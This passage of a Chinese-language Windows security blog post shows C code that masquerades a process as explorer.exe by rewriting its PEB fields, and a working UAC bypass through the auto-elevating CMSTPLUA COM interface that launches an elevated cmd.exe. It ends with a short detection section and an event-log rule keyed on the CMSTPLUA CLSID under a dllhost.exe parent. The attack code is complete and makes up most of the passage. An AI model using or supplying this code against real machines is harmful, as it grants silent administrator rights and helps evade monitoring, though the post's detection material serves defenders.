BOOLEAN Initialized;</span><br><span class="line">    HANDLE SsHandle;</span><br><span class="line">    LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">    LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">    LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">    PVOID EntryInProgress;</span><br><span class="line">    BOOLEAN ShutdownInProgress;</span><br><span class="line">    HANDLE ShutdownThreadId;</span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR</span> &#123;</span><br><span class="line">    UNICODE_STRING DosPath;</span><br><span class="line">    HANDLE Handle;</span><br><span class="line">&#125; CURDIR, *PCURDIR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR</span> &#123;</span><br><span class="line">    USHORT Flags;</span><br><span class="line">    USHORT Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS</span> &#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    HANDLE ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    HANDLE StandardInput;</span><br><span class="line">    HANDLE StandardOutput;</span><br><span class="line">    HANDLE StandardError;</span><br><span class="line">    CURDIR CurrentDirectory;</span><br><span class="line">    UNICODE_STRING DllPath;</span><br><span class="line">    UNICODE_STRING ImagePathName;</span><br><span class="line">    UNICODE_STRING CommandLine;</span><br><span class="line">    PVOID Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING WindowTitle;</span><br><span class="line">    UNICODE_STRING DesktopInfo;</span><br><span class="line">    UNICODE_STRING ShellInfo;</span><br><span class="line">    UNICODE_STRING RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">    ULONG EnvironmentVersion;</span><br><span class="line">    PVOID PackageDependencyData;</span><br><span class="line">    ULONG ProcessGroupId;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB</span> &#123;</span><br><span class="line">    BOOLEAN InheritedAddressSpace;</span><br><span class="line">    BOOLEAN ReadImageFileExecOptions;</span><br><span class="line">    BOOLEAN BeingDebugged;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        BOOLEAN BitField;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            BOOLEAN ImageUsesLargePages : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsImageDynamicallyRelocated : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN SkipPatchingUser32Forwarders : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsPackagedProcess : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsAppContainer : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsProtectedProcessLight : <span class="number">1</span>;</span><br><span class="line">            BOOLEAN IsLongPathAwareProcess : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    HANDLE Mutant;</span><br><span class="line">    PVOID ImageBaseAddress;</span><br><span class="line">    PPEB_LDR_DATA Ldr;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    PVOID SubSystemData;</span><br><span class="line">    PVOID ProcessHeap;</span><br><span class="line">    PRTL_CRITICAL_SECTION FastPebLock;</span><br><span class="line">    PVOID AtlThunkSListPtr;</span><br><span class="line">    PVOID IFEOKey;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG CrossProcessFlags;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            ULONG ProcessInJob : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessInitializing : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVEH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingVCH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessUsingFTH : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessPreviouslyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ProcessCurrentlyThrottled : <span class="number">1</span>;</span><br><span class="line">            ULONG ReservedBits0 : <span class="number">25</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        ULONG EnvironmentUpdateCount;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PVOID KernelCallbackTable;</span><br><span class="line">        PVOID UserSharedInfoPtr;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG SystemReserved[<span class="number">1</span>];</span><br><span class="line">    ULONG AtlThunkSListPtr32;</span><br><span class="line">    PVOID ApiSetMap;</span><br><span class="line">    ULONG TlsExpansionCounter;</span><br><span class="line">    PVOID TlsBitmap;</span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">2</span>];</span><br><span class="line">    PVOID ReadOnlySharedMemoryBase;</span><br><span class="line">    PVOID HotpatchInformation;</span><br><span class="line">    PVOID* ReadOnlyStaticServerData;</span><br><span class="line">    PVOID AnsiCodePageData;</span><br><span class="line">    PVOID OemCodePageData;</span><br><span class="line">    PVOID UnicodeCaseTableData;</span><br><span class="line">    ULONG NumberOfProcessors;</span><br><span class="line">    ULONG NtGlobalFlag;</span><br><span class="line">    LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">    SIZE_T HeapSegmentReserve;</span><br><span class="line">    SIZE_T HeapSegmentCommit;</span><br><span class="line">    SIZE_T HeapDeCommitTotalFreeThreshold;</span><br><span class="line">    SIZE_T HeapDeCommitFreeBlockThreshold;</span><br><span class="line">    ULONG NumberOfHeaps;</span><br><span class="line">    ULONG MaximumNumberOfHeaps;</span><br><span class="line">    PVOID* ProcessHeaps;</span><br><span class="line">    PVOID GdiSharedHandleTable;</span><br><span class="line">    PVOID ProcessStarterHelper;</span><br><span class="line">    ULONG GdiDCAttributeList;</span><br><span class="line">    PRTL_CRITICAL_SECTION LoaderLock;</span><br><span class="line">    ULONG OSMajorVersion;</span><br><span class="line">    ULONG OSMinorVersion;</span><br><span class="line">    USHORT OSBuildNumber;</span><br><span class="line">    USHORT OSCSDVersion;</span><br><span class="line">    ULONG OSPlatformId;</span><br><span class="line">    ULONG ImageSubsystem;</span><br><span class="line">    ULONG ImageSubsystemMajorVersion;</span><br><span class="line">    ULONG ImageSubsystemMinorVersion;</span><br><span class="line">    ULONG_PTR ImageProcessAffinityMask;</span><br><span class="line">    GDI_HANDLE_BUFFER GdiHandleBuffer;</span><br><span class="line">    PVOID PostProcessInitRoutine;</span><br><span class="line">    PVOID TlsExpansionBitmap;</span><br><span class="line">    ULONG TlsExpansionBitmapBits[<span class="number">32</span>];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlags;</span><br><span class="line">    ULARGE_INTEGER AppCompatFlagsUser;</span><br><span class="line">    PVOID pShimData;</span><br><span class="line">    PVOID AppCompatInfo;</span><br><span class="line">    UNICODE_STRING CSDVersion;</span><br><span class="line">    PVOID ActivationContextData;</span><br><span class="line">    PVOID ProcessAssemblyStorageMap;</span><br><span class="line">    PVOID SystemDefaultActivationContextData;</span><br><span class="line">    PVOID SystemAssemblyStorageMap;</span><br><span class="line">    SIZE_T MinimumStackCommit;</span><br><span class="line">    PVOID* FlsCallback;</span><br><span class="line">    LIST_ENTRY FlsListHead;</span><br><span class="line">    PVOID FlsBitmap;</span><br><span class="line">    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (<span class="built_in">sizeof</span>(ULONG) * <span class="number">8</span>)];</span><br><span class="line">    ULONG FlsHighIndex;</span><br><span class="line">    PVOID WerRegistrationData;</span><br><span class="line">    PVOID WerShipAssertPtr;</span><br><span class="line">    PVOID pContextData;</span><br><span class="line">    PVOID pImageHeaderHash;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        ULONG TracingFlags;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            ULONG HeapTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG CritSecTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG LibLoaderTracingEnabled : <span class="number">1</span>;</span><br><span class="line">            ULONG SpareTracingBits : <span class="number">29</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONGLONG CsrServerReadOnlySharedMemoryBase;</span><br><span class="line">&#125; PEB, *PPEB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_GDI_TEB_BATCH</span> &#123;</span><br><span class="line">    ULONG Offset;</span><br><span class="line">    UCHAR Alignment[<span class="number">4</span>];</span><br><span class="line">    ULONG_PTR HDC;</span><br><span class="line">    ULONG Buffer[GDI_BATCH_BUFFER_SIZE];</span><br><span class="line">&#125; GDI_TEB_BATCH, *PGDI_TEB_BATCH;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TEB_ACTIVE_FRAME_CONTEXT</span> &#123;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    PSTR FrameName;</span><br><span class="line">&#125; TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TEB_ACTIVE_FRAME</span> &#123;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_TEB_ACTIVE_FRAME</span>* Previous;</span><br><span class="line">    PTEB_ACTIVE_FRAME_CONTEXT Context;</span><br><span class="line">&#125; TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TEB</span> &#123;</span><br><span class="line">    NT_TIB NtTib;</span><br><span class="line">    PVOID EnvironmentPointer;</span><br><span class="line">    CLIENT_ID ClientId;</span><br><span class="line">    PVOID ActiveRpcHandle;</span><br><span class="line">    PVOID ThreadLocalStoragePointer;</span><br><span class="line">    PPEB ProcessEnvironmentBlock;</span><br><span class="line">    ULONG LastErrorValue;</span><br><span class="line">    ULONG CountOfOwnedCriticalSections;</span><br><span class="line">    PVOID CsrClientThread;</span><br><span class="line">    PVOID Win32ThreadInfo;</span><br><span class="line">    ULONG User32Reserved[<span class="number">26</span>];</span><br><span class="line">    ULONG UserReserved[<span class="number">5</span>];</span><br><span class="line">    PVOID WOW32Reserved;</span><br><span class="line">    LCID CurrentLocale;</span><br><span class="line">    ULONG FpSoftwareStatusRegister;</span><br><span class="line">    PVOID SystemReserved1[<span class="number">54</span>];</span><br><span class="line">    NTSTATUS ExceptionCode;</span><br><span class="line">    PVOID ActivationContextStackPointer;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">24</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">36</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ULONG TxFsContext;</span><br><span class="line">    GDI_TEB_BATCH GdiTebBatch;</span><br><span class="line">    CLIENT_ID RealClientId;</span><br><span class="line">    HANDLE GdiCachedProcessHandle;</span><br><span class="line">    ULONG GdiClientPID;</span><br><span class="line">    ULONG GdiClientTID;</span><br><span class="line">    PVOID GdiThreadLocalInfo;</span><br><span class="line">    ULONG_PTR Win32ClientInfo[<span class="number">62</span>];</span><br><span class="line">    PVOID glDispatchTable[<span class="number">233</span>];</span><br><span class="line">    ULONG_PTR glReserved1[<span class="number">29</span>];</span><br><span class="line">    PVOID glReserved2;</span><br><span class="line">    PVOID glSectionInfo;</span><br><span class="line">    PVOID glSection;</span><br><span class="line">    PVOID glTable;</span><br><span class="line">    PVOID glCurrentRC;</span><br><span class="line">    PVOID glContext;</span><br><span class="line">    NTSTATUS LastStatusValue;</span><br><span class="line">    UNICODE_STRING StaticUnicodeString;</span><br><span class="line">    WCHAR StaticUnicodeBuffer[<span class="number">261</span>];</span><br><span class="line">    PVOID DeallocationStack;</span><br><span class="line">    PVOID TlsSlots[<span class="number">64</span>];</span><br><span class="line">    LIST_ENTRY TlsLinks;</span><br><span class="line">    PVOID Vdm;</span><br><span class="line">    PVOID ReservedForNtRpc;</span><br><span class="line">    PVOID DbgSsReserved[<span class="number">2</span>];</span><br><span class="line">    ULONG HardErrorMode;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    PVOID Instrumentation[<span class="number">11</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID Instrumentation[<span class="number">9</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    GUID ActivityId;</span><br><span class="line">    PVOID SubProcessTag;</span><br><span class="line">    PVOID EtwLocalData;</span><br><span class="line">    PVOID EtwTraceData;</span><br><span class="line">    PVOID WinSockData;</span><br><span class="line">    ULONG GdiBatchCount;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PROCESSOR_NUMBER CurrentIdealProcessor;</span><br><span class="line">        ULONG IdealProcessorValue;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            UCHAR ReservedPad0;</span><br><span class="line">            UCHAR ReservedPad1;</span><br><span class="line">            UCHAR ReservedPad2;</span><br><span class="line">            UCHAR IdealProcessor;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG GuaranteedStackBytes;</span><br><span class="line">    PVOID ReservedForPerf;</span><br><span class="line">    PVOID ReservedForOle;</span><br><span class="line">    ULONG WaitingOnLoaderLock;</span><br><span class="line">    PVOID SavedPriorityState;</span><br><span class="line">    ULONG_PTR SoftPatchPtr1;</span><br><span class="line">    PVOID ThreadPoolData;</span><br><span class="line">    PVOID* TlsExpansionSlots;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    PVOID DeallocationBStore;</span><br><span class="line">    PVOID BStoreLimit;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ULONG MuiGeneration;</span><br><span class="line">    ULONG IsImpersonating;</span><br><span class="line">    PVOID NlsCache;</span><br><span class="line">    PVOID pShimData;</span><br><span class="line">    ULONG HeapVirtualAffinity;</span><br><span class="line">    HANDLE CurrentTransactionHandle;</span><br><span class="line">    PTEB_ACTIVE_FRAME ActiveFrame;</span><br><span class="line">    PVOID FlsData;</span><br><span class="line">    PVOID PreferredLanguages;</span><br><span class="line">    PVOID UserPrefLanguages;</span><br><span class="line">    PVOID MergedPrefLanguages;</span><br><span class="line">    ULONG MuiImpersonation;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        USHORT CrossTebFlags;</span><br><span class="line">        USHORT SpareCrossTebBits : <span class="number">16</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        USHORT SameTebFlags;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            USHORT SafeThunkCall : <span class="number">1</span>;</span><br><span class="line">            USHORT InDebugPrint : <span class="number">1</span>;</span><br><span class="line">            USHORT HasFiberData : <span class="number">1</span>;</span><br><span class="line">            USHORT SkipThreadAttach : <span class="number">1</span>;</span><br><span class="line">            USHORT WerInShipAssertCode : <span class="number">1</span>;</span><br><span class="line">            USHORT RanProcessInit : <span class="number">1</span>;</span><br><span class="line">            USHORT ClonedThread : <span class="number">1</span>;</span><br><span class="line">            USHORT SuppressDebugMsg : <span class="number">1</span>;</span><br><span class="line">            USHORT DisableUserStackWalk : <span class="number">1</span>;</span><br><span class="line">            USHORT RtlExceptionAttached : <span class="number">1</span>;</span><br><span class="line">            USHORT InitialThread : <span class="number">1</span>;</span><br><span class="line">            USHORT SpareSameTebBits : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID TxnScopeEnterCallback;</span><br><span class="line">    PVOID TxnScopeExitCallback;</span><br><span class="line">    PVOID TxnScopeContext;</span><br><span class="line">    ULONG LockCount;</span><br><span class="line">    ULONG SpareUlong0;</span><br><span class="line">    PVOID ResourceRetValue;</span><br><span class="line">&#125; TEB, *PTEB;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span><span class="params">(NTAPI* PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)</span><span class="params">(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">PVOID</span><span class="params">(NTAPI* LPRTLINITUNICODESTRING)</span><span class="params">(_Inout_ PUNICODE_STRING DestinationString, _In_opt_ PCWSTR SourceString)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPRTLENTERCRITICALSECTION)</span><span class="params">(_In_ PRTL_CRITICAL_SECTION CriticalSection)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPRTLLEAVECRITICALSECTION)</span><span class="params">(_In_ PRTL_CRITICAL_SECTION CriticalSection)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPLDRENUMERATELOADEDMODULES)</span><span class="params">(_In_opt_ ULONG Flags, _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction, _In_opt_ PVOID Context)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPNTALLOCATEVIRTUALMEMORY)</span><span class="params">(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect)</span></span>;</span><br><span class="line"></span><br><span class="line">LPRTLINITUNICODESTRING RtlInitUnicodeString;</span><br><span class="line">LPRTLENTERCRITICALSECTION RtlEnterCriticalSection;</span><br><span class="line">LPRTLLEAVECRITICALSECTION RtlLeaveCriticalSection;</span><br><span class="line">LPLDRENUMERATELOADEDMODULES LdrEnumerateLoadedModules;</span><br><span class="line">LPNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory;</span><br><span class="line"></span><br><span class="line">LPWSTR g_lpszExplorer2 = (LPWSTR)<span class="string">L&quot;C:\\windows\\explorer.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">supxLdrEnumModulesCallback</span><span class="params">(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)</span> </span>&#123;</span><br><span class="line">    PPEB Peb = (PPEB)Context;</span><br><span class="line">    <span class="keyword">if</span> (DataTableEntry-&gt;DllBase == Peb-&gt;ImageBaseAddress) &#123;</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;DataTableEntry-&gt;FullDllName, g_lpszExplorer2);</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;DataTableEntry-&gt;BaseDllName, <span class="string">L&quot;explorer.exe&quot;</span>);</span><br><span class="line">        *StopEnumeration = TRUE;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *StopEnumeration = FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__inline <span class="keyword">struct</span> <span class="title class_">_PEB</span>* <span class="built_in">NtCurrentPeb</span>() &#123; <span class="keyword">return</span> <span class="built_in">NtCurrentTeb</span>()-&gt;ProcessEnvironmentBlock; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">supMasqueradeProcess</span><span class="params">(VOID)</span> </span>&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    PPEB Peb = <span class="built_in">NtCurrentPeb</span>();</span><br><span class="line">    SIZE_T RegionSize = <span class="number">0x1000</span>;</span><br><span class="line">    PVOID g_lpszExplorer = <span class="literal">NULL</span>;</span><br><span class="line">    Status = <span class="built_in">NtAllocateVirtualMemory</span>(<span class="built_in">NtCurrentProcess</span>(), &amp;g_lpszExplorer, <span class="number">0</span>, &amp;RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">RtlEnterCriticalSection</span>(Peb-&gt;FastPebLock);</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;Peb-&gt;ProcessParameters-&gt;ImagePathName, g_lpszExplorer2);</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;Peb-&gt;ProcessParameters-&gt;CommandLine, g_lpszExplorer2);</span><br><span class="line">        <span class="built_in">RtlLeaveCriticalSection</span>(Peb-&gt;FastPebLock);</span><br><span class="line">        <span class="built_in">LdrEnumerateLoadedModules</span>(<span class="number">0</span>, &amp;supxLdrEnumModulesCallback, (PVOID)Peb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HRESULT <span class="title">CoCreateInstanceAsAdmin</span><span class="params">(HWND hwnd, REFCLSID rclsid, REFIID riid, __out <span class="type">void</span>** ppv)</span> </span>&#123;</span><br><span class="line">    BIND_OPTS3 bo;</span><br><span class="line">    WCHAR wszCLSID[<span class="number">50</span>];</span><br><span class="line">    WCHAR wszMonikerName[<span class="number">300</span>];</span><br><span class="line">    <span class="built_in">CoInitialize</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">StringFromGUID2</span>(rclsid, wszCLSID, <span class="built_in">sizeof</span>(wszCLSID) / <span class="built_in">sizeof</span>(wszCLSID[<span class="number">0</span>]));</span><br><span class="line">    HRESULT hr = <span class="built_in">StringCchPrintfW</span>(wszMonikerName, <span class="built_in">sizeof</span>(wszMonikerName) / <span class="built_in">sizeof</span>(wszMonikerName[<span class="number">0</span>]), <span class="string">L&quot;Elevation:Administrator!new:%s&quot;</span>, wszCLSID);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) <span class="keyword">return</span> hr;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;bo, <span class="number">0</span>, <span class="built_in">sizeof</span>(bo));</span><br><span class="line">    bo.cbStruct = <span class="built_in">sizeof</span>(bo);</span><br><span class="line">    bo.hwnd = hwnd;</span><br><span class="line">    bo.dwClassContext = CLSCTX_LOCAL_SERVER;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CoGetObject</span>(wszMonikerName, &amp;bo, riid, ppv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CMLuaUtilBypassUAC</span><span class="params">(LPWSTR lpwszExecutable)</span> </span>&#123;</span><br><span class="line">    HRESULT hr = <span class="number">0</span>;</span><br><span class="line">    CLSID clsidICMLuaUtil = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IID iidICMLuaUtil = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ICMLuaUtil* CMLuaUtil = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">CLSIDFromString</span>(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);</span><br><span class="line">    <span class="built_in">IIDFromString</span>(IID_ICMLuaUtil, &amp;iidICMLuaUtil);</span><br><span class="line">    <span class="built_in">CoCreateInstanceAsAdmin</span>(<span class="literal">NULL</span>, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));</span><br><span class="line">    hr = CMLuaUtil-&gt;lpVtbl-&gt;<span class="built_in">ShellExec</span>(CMLuaUtil, lpwszExecutable, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, SW_SHOW);</span><br><span class="line">    CMLuaUtil-&gt;lpVtbl-&gt;<span class="built_in">Release</span>(CMLuaUtil);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">SUCCEEDED</span>(hr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HMODULE hNtdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line">    RtlEnterCriticalSection = (LPRTLENTERCRITICALSECTION)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;RtlEnterCriticalSection&quot;</span>);</span><br><span class="line">    RtlInitUnicodeString = (LPRTLINITUNICODESTRING)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;RtlInitUnicodeString&quot;</span>);</span><br><span class="line">    RtlLeaveCriticalSection = (LPRTLLEAVECRITICALSECTION)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;RtlLeaveCriticalSection&quot;</span>);</span><br><span class="line">    LdrEnumerateLoadedModules = (LPLDRENUMERATELOADEDMODULES)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;LdrEnumerateLoadedModules&quot;</span>);</span><br><span class="line">    <span class="built_in">supMasqueradeProcess</span>();</span><br><span class="line">    <span class="built_in">CMLuaUtilBypassUAC</span>((LPWSTR)<span class="string">L&quot;c:\\windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/2026-02-08-learning_windows_6/1770637159312.png" alt="1770637159312"></p>
<p><img src="/image/2026-02-08-learning_windows_6/1770637290822.png" alt="1770637290822"></p>
<h6 id="检测方法-2"><a href="#检测方法-2" class="headerlink" title="检测方法"></a>检测方法</h6><p>这种 Bypass UAC 手段的核心特征是：</p>
<ol>
<li>恶意程序调用 COM 接口。</li>
<li>Windows 自动拉起一个高权限的 <code>dllhost.exe</code> 来承载该 COM 对象（因为 <code>CMSTPLUA</code> 支持自动提权）。</li>
<li>该 <code>dllhost.exe</code> 启动子进程（如 <code>cmd.exe</code>），其命令行会包含请求的 COM 组件的 CLSID</li>
</ol>
<p><img src="/image/2026-02-08-learning_windows_6/1770637587826.png" alt="1770637587826"></p>
<p>因此可以撰写的检测规则如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">any where winlog.event_id == 1 and</span><br><span class="line">winlog.event_data.ParentImage regex &quot;.*\\\\dllhost\\.exe&quot; and</span><br><span class="line">winlog.event_data.ParentCommandLine : &quot;*3E5FC7F9-9A51-4367-9063-A120244FBEC7*&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/image/2026-02-08-learning_windows_6/1770638446474.png" alt="1770638446474"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/friends/">friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
